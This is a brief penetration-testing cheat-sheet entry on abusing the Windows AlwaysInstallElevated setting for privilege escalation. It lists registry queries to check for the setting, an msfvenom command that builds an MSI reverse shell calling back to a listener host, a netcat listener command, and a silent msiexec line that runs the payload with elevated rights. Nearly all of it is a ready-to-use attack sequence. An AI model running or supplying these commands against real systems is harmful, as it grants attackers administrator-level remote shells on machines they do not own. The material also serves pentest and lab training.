# AlwaysInstalledElevates
##### Introduction
This is when the MSI installer, installs applications as Administrator by default. 

1. Query the registry for AlwaysInstallElevated keys:

	```
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	```

2. Generate a [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-portal) reverse shell using [msfvenom](https://book.hacktricks.xyz/shells/shells/msfvenom).

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

3. Launch a NetCat listener

	```
	nc -lnvp 53
	```

4. Run `reverse.msi` generated in Step 2. 

	```
	msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
	```